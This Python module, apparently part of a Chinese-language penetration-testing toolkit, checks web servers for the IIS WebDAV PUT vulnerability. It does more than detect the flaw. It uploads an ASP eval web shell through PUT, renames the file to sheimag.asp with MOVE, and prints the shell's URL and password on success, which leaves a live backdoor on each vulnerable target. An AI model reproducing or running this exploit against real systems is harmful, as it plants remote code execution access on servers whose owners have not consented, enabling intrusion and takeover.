#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class IISPutScan:
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        ssl = target["ssl"]
        proxy = target["proxy"]

        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)

        put_url = f'{url}/iiiis.txt'
        move_url = f'{url}/iiiis.txt'
        move_headers = {
            'User-Agent':header,
            'Destination':f'{url}/sheimag.asp'
        }

        put_data = "<%eval request('ddddwa')%>"
        if not self.batch:
            OutPrintInfo("IIS", "开始检测IIS-PUT漏洞...")
        try:
            response = requests.request('PUT',url=put_url,data=put_data,proxies=self.proxy,verify=ssl,headers=self.headers)
            if response.status_code == 201:
                response2 = requests.request('MOVE',url=move_url,headers=move_headers,proxies=self.proxy,verify=ssl)
                if response2.status_code == 200 or response2.status_code == 207:
                    if not self.batch:
                        OutPrintInfoSuc("IIS",f"目标 {url} 存在漏洞")
                        OutPrintInfo("IIS",f"[b bright_red]Shell @ {url}/sheimag.asp")
                        OutPrintInfo("IIS",f"[b bright_red]Pass @ ddddwa")
                    else:
                        OutPrintInfoSuc("IIS", f"目标 {url} 存在漏洞")
                        OutPutFile("iis_put.txt",f"目标 {url} 存在漏洞")

                else:
                    if not self.batch:
                        OutPrintInfo("IIS","目标不存在IIS-PUT漏洞")
            else:
                if not self.batch:
                    OutPrintInfo("IIS", "目标不存在IIS-PUT漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("IIS", "目标访问错误")
